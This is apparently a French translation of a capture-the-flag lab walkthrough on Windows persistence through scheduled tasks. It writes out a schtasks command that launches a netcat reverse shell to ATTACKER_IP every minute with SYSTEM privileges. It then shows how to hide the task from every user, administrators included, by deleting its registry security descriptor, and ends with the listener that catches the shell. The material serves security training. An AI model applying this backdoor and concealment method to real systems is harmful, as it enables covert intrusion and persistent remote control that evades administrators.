Nous pouvons également utiliser des tâches planifiées pour établir la persistance si nécessaire. Il existe plusieurs façons de planifier l'exécution d'une charge utile dans les systèmes Windows. Examinons-en quelques-uns :

Planificateur de tâches

La manière la plus courante de planifier des tâches consiste à utiliser le planificateur de tâches Windows intégré . Le planificateur de tâches permet un contrôle granulaire du moment où votre tâche démarrera, vous permettant de configurer des tâches qui s'activeront à des heures spécifiques, se répéteront périodiquement ou même se déclencheront lorsque des événements système spécifiques se produiront. Depuis la ligne de commande, vous pouvez utiliser `schtasks`pour interagir avec le planificateur de tâches. Une référence complète de la commande peut être trouvée sur [le site Web de Microsoft](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks) .

Créons une tâche qui exécute un shell inversé toutes les minutes. Dans un scénario réel, vous ne voudriez pas que votre charge utile s'exécute aussi souvent, mais nous ne voulons pas attendre trop longtemps pour cette salle :

Invite de commande

```
C:\> schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
SUCCESS: The scheduled task "THM-TaskBackdoor" has successfully been created.
```

Remarque : assurez-vous de l'utiliser `THM-TaskBackdoor`comme nom de votre tâche, sinon vous n'obtiendrez pas le drapeau.

La commande précédente créera une tâche "THM-TaskBackdoor" et exécutera un  `nc64`shell inversé vers l'attaquant. Les options `/sc`et `/mo`indiquent que la tâche doit être exécutée toutes les minutes. L' `/ru`option indique que la tâche s'exécutera avec les privilèges SYSTEM.

Pour vérifier si notre tâche a été créée avec succès, nous pouvons utiliser la commande suivante :

Invite de commande

```
C:\> schtasks /query /tn thm-taskbackdoor

Folder:\
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
thm-taskbackdoor                         5/25/2022 8:08:00 AM   Ready
```

Rendre notre tâche invisible

Notre tâche devrait être opérationnelle à présent, mais si l'utilisateur compromis tente de répertorier ses tâches planifiées, notre porte dérobée sera visible. Pour masquer davantage notre tâche planifiée, nous pouvons la rendre invisible pour tout utilisateur du système en supprimant son descripteur de sécurité (SD) . Le descripteur de sécurité est simplement une ACL qui indique quels utilisateurs ont accès à la tâche planifiée. Si votre utilisateur n'est pas autorisé à interroger une tâche planifiée, vous ne pourrez plus la voir, car Windows vous montre uniquement les tâches que vous êtes autorisé à utiliser. Supprimer le SD équivaut à interdire l'accès de tous les utilisateurs à la tâche planifiée, y compris les administrateurs.

Les descripteurs de sécurité de toutes les tâches planifiées sont stockés dans `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`. Vous trouverez une clé de registre pour chaque tâche, sous laquelle une valeur nommée "SD" contient le descripteur de sécurité. Vous ne pouvez effacer la valeur que si vous détenez les privilèges SYSTEM.

Pour masquer notre tâche, supprimons la valeur SD de la tâche "THM-TaskBackdoor" que nous avons créée précédemment. Pour ce faire, nous utiliserons `psexec`(disponible en `C:\tools`) pour ouvrir Regedit avec les privilèges SYSTEM :

Invite de commande

```
C:\> c:\tools\pstools\PsExec64.exe -s -i regedit
```

Nous supprimerons ensuite le descripteur de sécurité de notre tâche :

![9a6dad473b19be313e3069da0a2fc937](https://github.com/dsgsec/Red-Team/assets/82456829/bf9f3bf4-b99d-48a2-b84b-254d20a4a5c3)

Si nous essayons à nouveau d'interroger notre service, le système nous dira qu'une telle tâche n'existe pas :

Invite de commande

```
C:\> schtasks /query /tn thm-taskbackdoor ERROR: The system cannot find the file specified.
```

Si nous démarrons un écouteur nc sur la machine de notre attaquant, nous devrions récupérer un shell après une minute :

Boîte d'attaque

```
user@AttackBox$ nc -lvp 4449
```
